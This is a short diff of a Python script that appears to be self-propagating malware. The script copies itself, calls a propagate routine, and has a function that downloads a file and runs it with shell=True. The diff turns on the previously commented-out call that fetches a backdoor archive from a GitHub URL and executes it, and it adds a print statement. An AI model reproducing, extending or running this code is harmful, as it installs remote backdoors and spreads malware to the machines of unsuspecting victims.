@@ -92,6 +92,7 @@ def downloadBackDoor(url):
         outfile.write(content)
         outfile.close()
         run(os.path.abspath(filename))
+	print "finish downloading"
 
 def run(program):
 	process = sp.Popen(program, shell=True)
@@ -101,7 +102,7 @@ def main():
 	copy()
 	#hide()
 	propagate()
-	#downloadBackDoor("")
+	downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
 
 if __name__ == "__main__":
 	main()
